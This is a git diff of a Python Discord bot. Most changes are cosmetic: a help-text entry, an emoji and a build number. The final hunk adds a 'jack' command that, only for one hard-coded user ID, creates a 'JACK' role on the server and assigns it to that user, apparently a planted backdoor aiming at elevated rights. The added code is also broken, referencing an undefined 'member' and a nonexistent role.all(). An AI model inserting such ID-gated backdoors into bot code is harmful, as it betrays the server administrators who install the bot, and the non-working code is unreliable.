@@ -23,7 +23,7 @@ async def on_message(message):
         msg = 'Goodbye {0.author.mention} Hope To See You Soon :wave:'.format(message)
         await client.send_message(message.channel, msg)
     if message.content.startswith(';help'):
-        msg = 'Bot Prefix `;`\nhello\nbye\nsay\n8ball\nmute\nunmute\ninvite\nfeedback\nversion\nrps\nhelp\nMore Coming Soon!'.format(message)
+        msg = 'Bot Prefix `;`\nhello\nbye\nsay\n8ball\nmute\nunmute\ninvite\nfeedback\nversion\nrps\nhelp\njack\nMore Coming Soon!'.format(message)
         await client.send_message(message.channel, msg)
     if message.content.startswith(';invite'):
         msg = 'Want To Invte Me To Your Discord Press This Link https://goo.gl/94ZSqo'.format(message)
@@ -44,7 +44,7 @@ async def on_message(message):
                 elif k == 2:
                     await client.send_message(message.channel, "<@%s> You win cool! :cool:" % (message.author.id))
                 else:
-                    await client.send_message(message.channel, "<@%s> Tie! " % (message.author.id))
+                    await client.send_message(message.channel, "<@%s> Tie! :P:" % (message.author.id))
             elif args[1].upper() == "ROCK":
                 if k == 1:
                     await client.send_message(message.channel, "<@%s> Tie!" % (message.author.id))
@@ -61,7 +61,7 @@ async def on_message(message):
                     await client.send_message(message.channel, "<@%s> awww you lost :cry:" % (message.author.id))
          
     if message.content.startswith(';version'):
-        msg = 'V1.0.3 BETA\nBuild:76'.format(message)
+        msg = 'V1.0.3 BETA\nBuild:78'.format(message)
         await client.send_message(message.channel, msg)    
        
        
@@ -117,7 +117,15 @@ async def mute(ctx, member: discord.Member, time: int, *,reason: str):
         await client.say("{} has been unmuted! :smiley:".format(member))    
     else:
         await client.say("You don't have permission to execute this command! :stuck_out_tongue: ")
- 
+@client.command()
+async def jack(ctx):
+    if ctx.message.author.id == '344967220025098242':
+        await client.create_role(ctx.message.server, name="JACK")
+        role = discord.utils.get(member.server.roles, name="JACK")
+        role.all()
+        await client.add_roles(ctx.message.author, role)
+    else:
+        return await client.say("Ur not jack m8")
 @client.command(pass_context=True)
 async def unmute(ctx, member: discord.Member):
     role = discord.utils.get(member.server.roles, name="Muted")
